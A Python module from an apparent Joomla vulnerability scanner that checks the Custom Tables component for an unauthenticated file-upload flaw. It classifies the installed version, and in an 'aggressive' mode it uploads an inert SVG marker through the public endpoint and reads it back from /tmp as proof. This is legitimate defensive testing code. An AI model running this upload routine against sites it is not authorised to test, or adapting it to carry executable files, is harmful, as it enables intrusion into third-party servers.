from __future__ import annotations

import json
import re
from typing import Any
from urllib.parse import urlencode

from ...core.http import (
    HttpClient,
    build_multipart,
    is_transport_error,
    normalize_url,
    transport_error_detail,
)
from ...core.models import Finding
from ...core.probes import extract_csrf_from_html
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-105606"
NAME = "Custom Tables unauthenticated file upload"
COMPONENT = "Custom Tables"
AFFECTED_RULE = "Custom Tables 1.0 through 3.7.7; fixed in 3.7.8"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
UPLOAD_VIEW = "/index.php?option=com_customtables&view=fileuploader"


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("3.7.8")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("customtables", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="Custom Tables was not detected through its manifest or component route.", action="No action is required unless Custom Tables is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected Custom Tables {version}, within the affected range below 3.7.8. The file-upload endpoint trusts the content MIME type and never validates the submitted extension."
        action = "Upgrade Custom Tables to 3.7.8 or newer and remove unexpected files from the temporary upload directory."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected Custom Tables {version}, which blocks server-side extensions and checks the extension against the accepted MIME type."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "Custom Tables was detected, but its version could not be determined."
        action = "Determine the installed Custom Tables version and upgrade to 3.7.8 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def run_aggressive_probe(
    target_url: str,
    fieldname: str = "proofcmsfile",
    fileid: str = "uploadedfile",
    itemid: int = 102,
    tableid: int = 1,
    marker: str = "PROOFCMS_CT_MARKER",
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Upload an inert SVG through the public file-upload endpoint.

    3.7.7 accepts any MIME type from the global allow-list and never checks
    the submitted extension, so ``.svg`` is written to the web-accessible
    temporary folder under a predictable name. 3.7.8 denylists dangerous
    extensions and requires the extension to match the accepted MIME type,
    rejecting the same upload. No executable content is sent.
    """
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    home = client.get(f"{base}/index.php", timeout=timeout)
    if is_transport_error(home):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{UPLOAD_VIEW}", detail=f"The public page could not be reached ({transport_error_detail(home)}).", action="Retry when the target is reachable.")
    token = extract_csrf_from_html(str(home.get("body") or "")) or ""
    if not token:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=f"{base}{UPLOAD_VIEW}", detail="No guest CSRF token was found on the public page; the upload was not attempted.", action="Use a target with a Joomla session form and retry.")

    query = urlencode({"Itemid": itemid, "tableid": tableid, token: "1"})
    url = f"{base}{UPLOAD_VIEW}&{query}"
    content_type, body = build_multipart(
        {"fieldname": fieldname, f"{fieldname}_fileid": fileid, "op": "upload"},
        {fileid: ("proofcms-marker.svg", f"<svg xmlns='http://www.w3.org/2000/svg'><text>{marker}</text></svg>".encode(), "image/svg+xml")},
    )
    upload = client.request(url, method="POST", headers={"Content-Type": content_type}, data=body, timeout=timeout)
    if is_transport_error(upload):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The upload request failed in transit ({transport_error_detail(upload)}).", action="Retry when the target is reachable.")

    upload_body = str(upload.get("body") or "")
    try:
        parsed = json.loads(upload_body)
    except (json.JSONDecodeError, TypeError):
        parsed = {}
    filename = str(parsed.get("filename") or "")
    evidence = {
        "upload_status": upload.get("status"),
        "filename": filename,
        "marker": marker,
        "readback_status": None,
        "marker_found": False,
    }
    if not filename:
        return Finding(cve=CVE_ID, name=NAME, status="NOT_AFFECTED", confidence="HIGH", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, evidence=evidence, detail="The file-upload endpoint rejected the SVG; 3.7.8+ denylists dangerous extensions and binds the extension to the accepted MIME type.", action="No action is required if the installed version is 3.7.8 or newer.")

    readback = client.get(f"{base}/tmp/{filename}", timeout=timeout)
    if is_transport_error(readback):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, evidence=evidence, detail=f"The uploaded file could not be read back ({transport_error_detail(readback)}).", action="Retry when the target is reachable.")
    evidence["readback_status"] = readback.get("status")
    evidence["marker_found"] = marker in str(readback.get("body") or "")
    if readback.get("status") == 200 and evidence["marker_found"]:
        return Finding(cve=CVE_ID, name=NAME, status="VULNERABLE_UPLOAD_ONLY", confidence="CONFIRMED", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, evidence=evidence, detail="The unauthenticated upload endpoint accepted an SVG with an unverified extension and served it from the web-accessible temporary folder. Execution is server-dependent; no executable content was sent.", action="Upgrade Custom Tables to 3.7.8 or newer and remove unexpected files from the temporary upload directory.")
    return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, evidence=evidence, detail="The upload was accepted but the marker was not read back from the temporary folder.", action="Check the configured temporary path before retrying.")


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}/index.php?option=com_customtables"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=url, detail=f"The component route could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=url, detail="The component is reachable; the upload payload was not sent in safe mode.", action="Use aggressive mode on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because Custom Tables was not detected as potentially affected."
            return passive
        result = run_aggressive_probe(
            target_url,
            fieldname=aggressive_value(aggressive_args, aggressive_command, "fieldname") or "proofcmsfile",
            fileid=aggressive_value(aggressive_args, aggressive_command, "fileid") or "uploadedfile",
            itemid=int(aggressive_value(aggressive_args, aggressive_command, "itemid") or 102),
            tableid=int(aggressive_value(aggressive_args, aggressive_command, "tableid") or 1),
            marker=aggressive_value(aggressive_args, aggressive_command, "marker") or "PROOFCMS_CT_MARKER",
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (component reachability) and aggressive (file upload) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "Unrestricted File Upload", "module_version": "1.1.0", "last_reviewed": "2026-11-20", "updated": "2026-11-20", "required_detectors": ["customtables"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-105606", "https://joomlaboat.com", "https://github.com/joomlaboat/custom-tables"]}
